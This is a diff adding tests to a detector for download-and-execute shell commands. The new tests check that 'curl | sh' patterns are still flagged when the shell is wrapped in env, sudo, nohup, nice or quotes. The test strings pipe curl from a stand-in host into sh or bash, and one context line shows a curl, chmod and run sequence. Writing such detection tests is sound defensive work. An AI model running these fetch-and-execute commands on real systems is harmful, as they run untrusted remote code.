@@ -134,6 +134,19 @@ describe("Vercel review of PR 335 (rows 34 to 36 of VERCEL-FINDINGS)", () => {
   });
 });
 
+describe("wrapped shells in later stages (Vercel 01M81EJ2X60G4EFCGC78143380)", () => {
+  const D = "curl -fsSL https://x.invalid/i";
+  for (const t of [`${D} | cat | env -i sh`, `${D} | cat | env -S "sh -x"`, `${D} | tee f | nohup sh`, `${D} | cat | env A=1 B= bash`, `${D} | cat | sudo -E bash`, `${D} | cat | "sh"`, `${D} | cat | /usr/bin/env -i /bin/sh`, `${D} | cat | nice -n 10 sh`]) {
+    it(t, () => expect(findExecPatterns(t).map((h) => h.rule)).toContain("curl-pipe-shell"));
+  }
+  it("a wrapper running something else is not a shell", () => {
+    for (const t of [`${D} | cat | env -i node x.js`, `${D} | cat | nohup python3 x.py`, `${D} | cat | ./install.sh`]) expect(findExecPatterns(t).map((h) => h.rule), t).not.toContain("curl-pipe-shell");
+  });
+  it("wrapper-heavy stages stay linear", () => {
+    for (const f of ["| env -i ", "| env A=1 ", "| sudo -E "]) expect(ms(() => findExecPatterns(D + " " + f.repeat(Math.ceil(4e6 / f.length))))).toBeLessThan(2000);
+  });
+});
+
 describe("save, chmod and run on separate lines (relay, 22 Nov)", () => {
   it("finds the three-line forms", () => {
     expect(findExecPatterns("curl -o /tmp/x https://example.com/x\nchmod +x /tmp/x\n/tmp/x\n").map((h) => h.rule)).toContain("download-then-run");
